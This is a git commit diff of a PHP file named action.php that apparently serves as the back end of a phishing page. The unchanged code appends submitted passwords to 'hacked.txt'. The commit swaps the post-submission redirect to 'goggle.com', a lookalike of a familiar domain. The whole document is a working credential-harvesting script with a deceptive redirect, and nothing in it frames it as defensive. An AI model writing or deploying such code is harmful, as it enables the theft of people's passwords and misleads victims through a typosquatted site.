de29c4133fda9045ffece91953bf876521cffd29
Manish Giri <51409412+Manish2414@users.noreply.github.com>
2020-06-22 11:22:36 +0545

    Update action.php

--- action.php
+++ action.php
@@ -1,5 +1,5 @@
 <?php
 
 file_put_contents("hacked.txt", " [password:] " . $pwd = $_POST['psw'] . "\n", FILE_APPEND);
-header('Location: https://youtu.be/pUQErA2SxPU');
+header('Location: https://www.goggle.com');
 ?>
